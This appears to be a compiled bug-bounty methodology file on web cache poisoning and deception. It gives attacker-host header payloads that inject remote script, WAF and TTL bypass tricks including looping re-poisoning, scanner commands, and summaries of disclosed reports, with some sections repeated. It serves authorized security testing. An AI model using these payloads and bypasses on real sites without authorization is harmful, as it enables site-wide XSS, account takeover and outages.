- When chaining poisoned redirects into JS execution, confirm the victim page actually requests the poisoned resource (check the HTML for the script tag) rather than assuming it.### Escalation and related chains
### Escalation chains

- Cache poisoning -> stored XSS.
- Cache deception -> PII theft.

### Related Skills & Chains

- **`xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
- **`request-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
- **`auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
- **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.

### Related Skills & Chains

- **`hunt-xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
- **`hunt-http-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
- **`hunt-auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
- **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.### Tools
### Tools

`Burp` · `Web Cache Vulnerability Scanner` · `Param Miner`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_web-cache.txt` | 53 |
| `~/.local/share/hackerone-reports/wordlists/params_web-cache.txt` | 29 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_web-cache.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_web-cache.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Find unkeyed headers and cache-deception paths manually; templates only cover known patterns.

```sh
nuclei -u https://target -tags cache \
       -severity low,medium,high,critical -rl 40 -o nuclei_web-cache.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/cache-poisoning-fuzz.yaml \
       -rl 40 -o nuclei_web-cache_cache-poisoning-fuzz.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic/cache-poisoning.yaml \
       -rl 40 -o nuclei_web-cache_cache-poisoning.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.### Real-world examples
### Real Impact Examples

**Scenario 1 — Mass DoS on CDN Asset Delivery (Shopify CDN)**
An attacker identified that CDN-served JavaScript assets on `cdn.shopify.com` could be poisoned by sending a request with a crafted header that caused the origin to return a 4xx error. The CDN cached this error response. Any merchant storefront loading that asset then received the cached error instead of the valid JS file — breaking checkout flows and storefront functionality across all stores sharing that CDN path. One HTTP request, global merchant impact, persisting until cache TTL expired.

**Scenario 2 — Account Takeover via Web Cache Deception**
On a platform serving authenticated account pages, an attacker crafted a URL like `/account/profile/photo.jpg` and sent it to a victim (via phishing link). When the victim (authenticated) visited the URL, the server responded with their full account profile page (name, email, session tokens). Because the URL ended in `.jpg`, the CDN cached the authenticated response publicly. The attacker then fetched `/account/profile/photo.jpg` without authentication and received the victim's account data — enabling full account takeover. Impact was amplified because the cache served the same response to any subsequent requester.

**Scenario 3 — Affiliate Link Hijacking via URL Path Manipulation (Shopify Linkpop)**
An attacker discovered that the Linkpop affiliate link service would cache responses based on URL path but reflected a manipulated product destination URL in the cached HTML. By visiting a specially crafted path before legitimate users, the attacker poisoned the cache to redirect affiliate clicks to an attacker-controlled domain instead of the legitimate Amazon product. Victims clicking what appeared to be valid merchant links were sent to attacker infrastructure, enabling credential phishing and loss of affiliate commission revenue for the legitimate merchant.

---### Sources and related reading
### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class web-cache --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class web-cache
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class web-cache
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class web-cache --min-bounty 1000
```

### Related

- `hackerone-request-smuggling` (101 reports)
- `hackerone-xss` (2,569 reports)
- `hackerone-info-disclosure` (1,827 reports)

### Related

- `request-smuggling` (101 reports)
- `xss` (2,569 reports)
- `info-disclosure` (1,827 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/gotta-cache-em-all
2. https://portswigger.net/web-security/web-cache-deception
3. https://portswigger.net/web-security/web-cache-poisoning
4. https://portswigger.net/research/web-cache-entanglement
5. https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures
6. https://hacktricks.wiki/en/pentesting-web/cache-deception/index.html
7. https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943### Additional notes
### Parameters observed

`for[]` · `for` · `dontpoisoneveryone` · `cachebuster` · `cb` · `cachebust` · `yeettest` · `token` · `qwKzzSR` · `xyzxyz` · `hackerone` · `petIncluded` · `filterByTotalPrice` · `ssr` · `email` · `authenticity_token` · `letme` · `enable_registration` · `redirectTo` · `referrer_page_location`

### DoS on PayPal via web cache poisoning

`#622122` · PayPal · $9,700 · medium · 2019-10-23 · ▲851
> On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'. This was patched and awarded a $9,700 bounty. By the time you read this, there should be a full writeup on this technique at https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning

### Stored XSS on https://paypal.com/signin via cache poisoning

`#488147` · PayPal · $18,900 · high · 2019-08-07 · ▲685
> Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page.

### Denial of service to WP-JSON API by cache poisoning the CORS allow origin header

`#591302` · Automattic · $0 · medium · 2020-04-16 · ▲405
> The WP-JSON implementation on some wordpress.com websites I've tested is vulnerable to denial of service where by an attacker can provide an arbitrary Origin header in the request, which is then echoed back in the response via the Access-Control-Allow-Origin header, which is cached and served to other requests.

### DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com

`#1695604` · Shopify · $3,800 · medium · 2025-06-04 · ▲266
> There's a web cache poisoning vulnerability on cdn.shopify.com that allows the attacker to block access to any file hosted on the website. This vulnerability exists as the cache server deals with the backslash as a frontslash. However, the original server returns a 404 error when a backslash exists in the URL So, according to the caching server, these two URLs are the same https://cdn.shopify.com/static/javascripts/vendor/bugsnag.v7.4.0.min.js…

### Denial of service via cache poisoning

`#409370` · HackerOne · $2,500 · medium · 2018-12-22 · ▲253
> An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port. To replicate: Then try to load https://www.hackerone.com/index.php?dontpoisoneveryone=1 in your browser.

### Disclosed Report Citations (2017-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans the two major families: cache **poisoning** (attacker influences a cached response served to victims) and cache **deception** (attacker tricks the cache into storing a victim's private response).

1. **Shopify — Cache poisoning via X-Forwarded-Host** ([H1 #977851](https://hackerone.com/reports/977851))
    - Subclass: X-Forwarded-Host header poisoning (unkeyed input → redirect/script-src corruption)
    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.com` — single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
    - Root cause: X-Forwarded-Host influenced asset/redirect URL generation but was NOT part of the cache key
    - Year: 2020 — **$1,300 → escalated to $6,300** (one-shot poison, multi-host blast radius)

2. **HackerOne — Cache poisoning DoS via X-Forwarded-Port** ([H1 #409370](https://hackerone.com/reports/409370))
    - Subclass: X-Forwarded-Host / X-Forwarded-Port DoS (poisoned redirect to invalid port)
    - Payload: `GET /<redirect-path>` with `X-Forwarded-Port: 1` — cached 301 redirect pointed legitimate users at port 1, breaking access
    - Root cause: trusted X-Forwarded-* headers in 301 redirect generation; cache stored the bad Location
    - Year: 2018 — **$2,500** (foundational H1-on-H1 case)

3. **GitLab — Cache poisoning DoS via X-HTTP-Method-Override** ([H1 #1160407](https://hackerone.com/reports/1160407))
    - Subclass: method-cloaking / GCS cache-key bleed (HEAD response stored under GET key)
    - Payload: `GET /assets/webpack/*.js` with `X-HTTP-Method-Override: HEAD` — GCS backend honored the override and returned an empty body; CDN cached it as the canonical GET response
    - Root cause: CDN cache not method-aware; HEAD body (empty) overwrote GET entry for cached static assets
    - Year: 2021 — **$2,500** (DoS normally OOS, paid for novelty)

4. **PayPal — Web Cache Deception (Omer Gil original)** ([Blog](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html))
    - Subclass: classic WCD via `.css`/`.jpg`/etc. path appending on authenticated routes
    - Payload: `GET https://www.paypal.com/myaccount/home/foo.css` — origin served full authenticated account page; CDN cached it as "static .css" for ~5 hours
    - Root cause: origin routed unknown path suffixes to the parent dynamic handler; CDN cached based purely on the static-looking file extension
    - Year: 2017 — **$3,000** (PortSwigger Top-10 Web Hacking Technique of 2017, #2)

5. **Cloudflare PBB — Cache Deception Armor bypass via `.avif`** ([H1 #1391635](https://hackerone.com/reports/1391635))
    - Subclass: CDN-specific allowlist bypass (Cloudflare's WCD protection feature) using an obscure image extension
    - Payload: `GET https://<protected-origin>/account/me.avif` — Cloudflare's Cache Deception Armor extension list omitted `.avif`, so the authenticated HTML response was cached
    - Root cause: Cache Deception Armor used a static, incomplete extension allowlist that did not cover modern image MIME types
    - Year: 2022 — Cloudflare PBB bounty (amount undisclosed)

6. **Akamai (PayPal/Airbnb/Goldman Sachs) — Hop-by-hop header smuggling → server-side edge poisoning** ([Tediosi & Mariani writeup](https://medium.com/@jacopotediosi/worldwide-server-side-cache-poisoning-on-all-akamai-edge-nodes-50k-bounty-earned-f97d80f3922b))
    - Subclass: CDN-specific request-smuggling that lands attacker responses in Akamai's edge cache for nearby IPs
    - Payload: `Connection: Content-Length` + crafted request — Akamai's first proxy stripped Content-Length as hop-by-hop, second proxy treated body as a second request whose response was cached at the edge
    - Root cause: inconsistent handling of hop-by-hop headers across Akamai proxy tiers caused desync; smuggled responses were server-side cached globally
    - Year: 2022 — **>$50K total** across affected programs (PayPal $25,200 + Airbnb $14,875 + Goldman Sachs $100), PortSwigger Top-10 Web Hacking Techniques 2022 nominee

7. **James Kettle (PortSwigger) — "Gotta cache 'em all": path-normalization & WCD against Cloudflare/Fastly/GCP** ([PortSwigger Research](https://portswigger.net/research/gotta-cache-em-all))
    - Subclass: cache-key path normalization discrepancies and Web Cache Deception across major CDNs (Cloudflare, Fastly, GCP/Google Cloud) — the 2024 research named in this skill's description
    - Payload: origin-vs-cache delimiter/normalization disagreements (e.g. encoded path segments and static-suffix tricks) that cause the cache to store a dynamic/authenticated response under a static-looking key
    - Root cause: cache and origin disagree on how to normalize/parse the URL path, so the cache key does not match the resource the origin actually served
    - Year: 2024 — coordinated CDN-vendor disclosure; methodology research (no single bounty), PortSwigger Top-10 Web Hacking Techniques 2024 entry

---

### Origin header → ACAO cache poisoning

Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Access-Control-Allow-Origin` and then cached: `curl -H "Origin: evil.example" URL -I` on two consecutive hits. A cached attacker/`*` ACAO breaks CORS for legit users (cache-DoS); a cached permissive ACAO enables cross-user data reads. Disclosed: reports/591302.### Companion methodology (deduplicated)
### hunting / references/techniques.md

# Web Cache — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Identify cache layers, keys, and TTLs from headers and behavior.

- Find unkeyed inputs: X-Forwarded-Host, X-Host, X-Original-URL, cookies, headers reflected in responses.

- Test cache deception with static extensions on authenticated routes.

- Check normalization mismatches between cache and origin.



## Bypass tricks



- Use unkeyed headers that the origin reflects into redirects or HTML.

- Exploit path normalization: `/x/..%2faccount`.

- Poison only your own cache key, then request the victim URL.



## Deeper checklist



- Identify cache layers, cache keys, and TTLs via response headers and behavior.

- Find unkeyed inputs: X-Forwarded-Host, X-Host, X-Original-URL, cookies, headers reflected in responses.

- Test cache deception with static extensions on authenticated routes.

- Check normalization mismatches between cache and origin (encoding, path, host).

- Demonstrate poisoning a victim response or leaking another user's data.

- Avoid persistent poisoning; use a cache-buster where possible.



## Techniques from real reports



One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.



- **DoS on PayPal via web cache poisoning** — `#622122` · PayPal · $9,700 · ▲851

  > On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'.

- **Stored XSS on https://paypal.com/signin via cache poisoning** — `#488147` · PayPal · $18,900 · ▲685

  > I've posted a full writeup over at https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn

- **Denial of service to WP-JSON API by cache poisoning the CORS allow origin header** — `#591302` · Automattic · $0 · ▲405

  > The WP-JSON implementation on some wordpress.com websites I've tested is vulnerable to denial of service where by an attacker can provide an arbitrary `Origin` header in the request, which is then echoed back in the response via the…

- **DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com** — `#1695604` · Shopify · $3,800 · ▲266

  > So, when an attacker sends a request with replacing the slashes with backslashes for a certain file, the server will return 404 Not Found error page, and this error will be saved into the cache and any upcoming requests to this file will return 404 Not Found…

- **Denial of service via cache poisoning** — `#409370` · HackerOne · $2,500 · ▲253

  > An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port.

- **Static files on HackerOne.com can be made inaccessible through Cache Poisoning attack** — `#1181946` · HackerOne · $0 · ▲228

  > The same attack that was reproduced on `/assets/static/js/8.9572d249.chunk.js?hackerone=poc` could be reproduced on the actual file without any random parameter.

- **XSS and cache poisoning via upload.twitter.com on ton.twitter.com** — `#84601` · X / xAI · $0 · ▲198

  > You may also visit http://innerht.ml/pocs/twitter-upload-xss to see the attack in action.

- **Cache Deception Allows Account Takeover** — `#1698316` · Expedia Group Bug Bounty · $0 · ▲160

  > I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access the `ha.crumb` token located in `/traveler/profile/edit`

- **Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)** — `#1760213` · Expedia Group Bug Bounty · $0 · ▲117

  > The server blocks `</script`but if I send `</sc"ript `

- **Cache Poisoning DoS on downloads.exodus.com** — `#1173153` · Exodus · $0 · ▲110

  > GET /releases/hashes-exodus-21.2.12.txt?cachebuster=hackerone HTTP/1.1

- **Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS** — `#303730` · GSA Bounty · $750 · ▲93

  > In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg…

- **URL Path Manipulation Enables Cache Poisoning of Amazon Affiliate Products in Shopify Linkpop** — `#1848940` · Shopify · $500 · ▲88

  > In your attacker's Linkpop account, add a new Amazon product using the following crafted link `https://amazon.ca/dp/[VICTIM-PRODUCT-ID]/../[ATTACKER-PRODUCT-ID]` and make sure to replace the placholders

- **Cache poisoning Denial of Service affecting assets.gitlab-static.net** — `#1160407` · GitLab · $0 · ▲83

  > However since the `x-http-method-override` header is not included in the cache key and the varnish configuration used does not proccess the `x-http-method-override`, this empty response will also be forwarded to all other users requesting the file, with…

- **https://themes.shopify.com::: Host header web cache poisoning lead to DoS** — `#1096609` · Shopify · $2,900 · ▲82

  > $ while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done

- **Cache Poisoning DoS on updates.rockstargames.com** — `#1219038` · Rockstar Games · $0 · ▲77

  > In this report, the researcher discovered that there was a cache poisoning weakness on `updates.rockstargames.com` due to an unkeyed header, `trailer`.

- **Cache poisoning via X-Forwarded-Host in www.shopify.com/partners/blog** — `#977851` · Shopify · $1,000 · ▲67

  > i've logged to my VPS to verify this bug and downloaded poisoned page (https://www.shopify.com/partners/blog/7-web-design-and-development-awards-you-should-enter) , it's contains links to collabolator:

- **CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)** — `#260697` · Discourse · $0 · ▲58

  > Add the `no-cache` headers, `Cache-Control` and/or `Expire` on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific.

- **DOS via cache poisoning on [developer.mozilla.org]** — `#1976449` · Mozilla · $0 · ▲55

  > This is possible by adding an header and a value causing an error on the back-end side (error 404), the bad configuration of the cache makes it possible to save the response there and to serve it to users visiting the page, making the page completely…

- **Web Cache Deception Attack (XSS)** — `#394016` · Discourse · $256 · ▲51

  > Also, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:

- **Shopify.com Web Cache Deception vulnerability leads to personal information and CSRF tokens leakage** — `#1271944` · Shopify · $800 · ▲48

  > - `https://help.shopify.com/es/manual/your-account/copyright-and-trademark/<RANDOM STRING .css`

- **Web Cache Deception vulnerability on algolia.com leads to personal information leakage** — `#1530066` · Algolia · $400 · ▲47

  > A web cache deception(WCD) was found on our main website (algolia.com).

- **Web Cache poisoning attack leads to User information Disclosure and more** — `#631589` · Lyst · $0 · ▲45

  > https://www.lyst.com/shop/trends/mens-dress-shoes/blahblah.css

- **DNS Cache Poisoning** — `#487` · HackerOne · $100 · ▲41

  > I noticed if I made a request to your website, intercepted the request, and added the header...

- **Web cache poisoning leads to disclosure of CSRF token and sensitive information** — `#504514` · Smule · $0 · ▲39

  > The page [https://www.smule.com/s/smule groups/user groups/user name](https://www.smule.com/s/smule groups/user groups/fossnow27) is vulnerable to web cache poisoning, on adding `X-Forwarded-Host` header to the request multiple request links get change which…

- **Web Cache Poisoning on  █████** — `#1183263` · U.S. Dept Of Defense · $0 · ▲36

  > The web application `https://████████` uses a web cache to more efficiently serve its pages to the users.

- **Bypassing Cache Deception Armor using .avif extension file** — `#1391635` · Cloudflare Public Bug Bounty · $0 · ▲36

  > I was able to achieve Cache Deception and/ Poisoning to Cloudflare Customers who were using `Cache Deception Armor` Software using `.avif` extension file

- **Cache poisoning using NULL bytes and long URLs** — `#334709` · Greenhouse.io · $0 · ▲32

  > We can see that the value of the `applicationURI` URL prefix is 6155 bytes long, which is close to the maximum number of bytes in the URL I was able to send to the `board.greenhouse.io` server, before receiving `ERR CONNECTION CLOSED`.

- **Web cache poisoning at www.acronis.com** — `#1010858` · Acronis · $0 · ▲29

  > Remove the parameters, x-forwarded-port, and origin in the request header.

- **HTTP request smuggling on Basecamp 2 allows web cache poisoning** — `#919175` · Basecamp · $0 · ▲28

  > Using HTTP request smuggling attack, It is possible to poison the cache with the off-site redirect response using `X-Forwarded-Host` request header in smuggled request.

- **Web cache deception attack - expose token information** — `#397508` · Chaturbate · $0 · ▲28

  > Then after go to `https://chaturbate.com/my collection/min.js`.



## Case studies



### DoS on PayPal via web cache poisoning

`#622122` · PayPal · $9,700 · medium · 2019-10-23 · ▲851

> On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'. This was patched and awarded a $9,700 bounty. By the time you read this, there should be a full writeup on this technique at https://portswigger.net/research/responsible-denial-of-service-with-web-cache-poisoning



### Stored XSS on https://paypal.com/signin via cache poisoning

`#488147` · PayPal · $18,900 · high · 2019-08-07 · ▲685

> Due to a configuration in frontend, caching servers, it was possible for a researcher to use request smuggling to convert a page request into a cached redirect. If the cached redirect were accessed by a legitimate user, an attacker's content would be rendered instead of the requested page. While this would not impact any back-end data, this could interfere with the integrity of certain pages, including potential interference with the sign-in page.



### Denial of service to WP-JSON API by cache poisoning the CORS allow origin header

`#591302` · Automattic · $0 · medium · 2020-04-16 · ▲405

> The WP-JSON implementation on some wordpress.com websites I've tested is vulnerable to denial of service where by an attacker can provide an arbitrary Origin header in the request, which is then echoed back in the response via the Access-Control-Allow-Origin header, which is cached and served to other requests.



### DoS Vulnerability via Cache Poisoning on cdn.shopify.com and shopify-assets.shopifycdn.com

`#1695604` · Shopify · $3,800 · medium · 2025-06-04 · ▲266

> There's a web cache poisoning vulnerability on cdn.shopify.com that allows the attacker to block access to any file hosted on the website. This vulnerability exists as the cache server deals with the backslash as a frontslash. However, the original server returns a 404 error when a backslash exists in the URL So, according to the caching server, these two URLs are the same https://cdn.shopify.com/static/javascripts/vendor/bugsnag.v7.4.0.min.js…



### Denial of service via cache poisoning

`#409370` · HackerOne · $2,500 · medium · 2018-12-22 · ▲253

> An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port. To replicate: Then try to load https://www.hackerone.com/index.php?dontpoisoneveryone=1 in your browser.



## Query the corpus



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class web-cache --limit 20

python3 ~/.local/share/hackerone-reports/h1.py stats --class web-cache

python3 ~/.local/share/hackerone-reports/h1.py show <id> --full

```



Search by technology, endpoint, parameter, or program. Examples:



```sh

python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class web-cache

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class web-cache --min-bounty 1000

```



## Bypass Techniques



**Defense: WAF blocking known poison headers**

- Bypass: Use less-common header variants: `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=evil.com`, `X-Original-URL`

- Bypass: Header value encoding: `X-Forwarded-Host: evil%2ecom`

- Bypass: Case variation: `x-forwarded-host`, `X-FORWARDED-HOST`



**Defense: Stripping attacker-supplied headers at edge**

- Bypass: Use HTTP/2 pseudo-header manipulation if the proxy downgrades to HTTP/1.1

- Bypass: Inject via HTTP Request Smuggling — smuggle a request with poison headers past the WAF to hit the cache server directly



**Defense: Require authentication before caching**

- Bypass: Web Cache Deception — trick the cache into storing authenticated content by appending `.css`/`.js` to the URL, which matches a cache rule that ignores auth



**Defense: Cache key includes full URL with query string**

- Bypass: HTTP Parameter Pollution — some parsers take the first occurrence, caches key on full string; inject `?legit=1&param=evil` and cache stores it under `?legit=1&param=evil` but victim visits `?legit=1`

- Bypass: Fat GET request — send body parameters that the backend processes but the cache ignores



**Defense: Short TTL / rapid cache purging**

- Bypass: Automate re-poisoning; send the poison request in a loop just ahead of TTL expiry

- Bypass: Target CDN nodes with longer default TTLs by routing requests through specific PoPs



**Defense: `Cache-Control: private` on sensitive endpoints**

- Bypass: Check if CDN respects this header (some CDNs ignore it if an admin has overridden cache rules globally)

- Bypass: Find adjacent cacheable endpoints that reflect the same sensitive data



---## Probes

- Unkeyed header reflection, query-key normalization, static-extension suffix trick, cache-buster to isolate tests.

## Supporting data

- `references/evidence.md` — corpus technique frequencies, case studies, approach patterns
- `references/payloads.md` — curated payload bank + upstream payload references
- `references/wordlists/` — 2 mined paths/params/payload lists
- `bbhunt-methodology` — orchestrator, state machine and class router
